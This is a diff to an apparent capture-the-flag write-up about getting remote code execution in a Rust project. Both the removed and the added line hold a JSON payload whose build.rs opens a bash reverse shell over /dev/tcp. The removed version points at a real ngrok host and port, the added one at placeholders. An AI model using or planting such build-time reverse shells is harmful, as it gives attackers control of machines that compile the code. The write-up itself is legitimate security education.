@@ -31,7 +31,7 @@ project_dir/
 <p align="justify">So, in the context of this challenge, it was an open door to remote code execution (RCE). As a result, I deployed a reverse shell using the following JSON payload (the reverse shell payload is available in revshell.rs in this repository):</p>
 
 ````json
-{"src/main.rs":"fn main() { println!(\"Hello, world!\"); }", "build.rs":"use std::process::Command; fn main() { let ip = \"0.tcp.eu.ngrok.io\"; let port = \"13457\"; let _ = Command::new(\"bash\").arg(\"-c\").arg(format!(\"exec 5<>/dev/tcp/{}/{}; cat <&5 | while read line; do $line 2>&5 >&5; done\", ip, port)).spawn().expect(\"Failed\"); println!(\"Reverse shell attempted to connect to {}:{}\", ip, port); }"}
+{"src/main.rs":"fn main() { println!(\"Hello, world!\"); }", "build.rs":"use std::process::Command; fn main() { let ip = \"IP ADDR\"; let port = \"PORT\"; let _ = Command::new(\"bash\").arg(\"-c\").arg(format!(\"exec 5<>/dev/tcp/{}/{}; cat <&5 | while read line; do $line 2>&5 >&5; done\", ip, port)).spawn().expect(\"Failed\"); println!(\"Reverse shell attempted to connect to {}:{}\", ip, port); }"}
 ````
 
 <p align="center"><img src="Screenshots/S2.png" alt="Desc"></p>
